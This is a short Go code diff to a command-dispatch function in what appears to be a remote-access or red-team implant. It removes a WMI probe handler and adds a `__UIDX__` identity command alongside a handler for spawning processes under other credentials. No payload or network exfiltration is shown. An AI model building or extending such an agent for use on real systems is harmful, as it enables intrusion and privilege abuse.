@@ -532,19 +532,6 @@ func execute(command string, cfg *config, client *http.Client) (string, string) 
 		}
 		return result, "output"
 	}
-	if strings.HasPrefix(trimmed, wmiProbePrefix) {
-		result, err := wmiProbeCommand(trimmed)
-		if err != nil {
-			if result != "" {
-				// Keep the recorded evidence visible even when the run
-				// failed: the exit-contract note matters as much as the
-				// error itself.
-				return result + "\nWMI probe failed: " + err.Error(), "output"
-			}
-			return "WMI probe failed: " + err.Error(), "output"
-		}
-		return result, "output"
-	}
 	if strings.HasPrefix(trimmed, "__SPAWNAS_STAGED__") {
 		result, err := spawnasStagedCommand(trimmed, cfg)
 		// CreateProcessWithLogonW leaves the thread token untouched, but keep
@@ -588,6 +575,13 @@ func execute(command string, cfg *config, client *http.Client) (string, string) 
 		result, err := uidAction()
 		if err != nil {
 			return "Uid failed: " + err.Error(), "output"
+		}
+		return result, "output"
+	}
+	if trimmed == "__UIDX__" {
+		result, err := getuidxAction()
+		if err != nil {
+			return "Uidx failed: " + err.Error(), "output"
 		}
 		return result, "output"
 	}
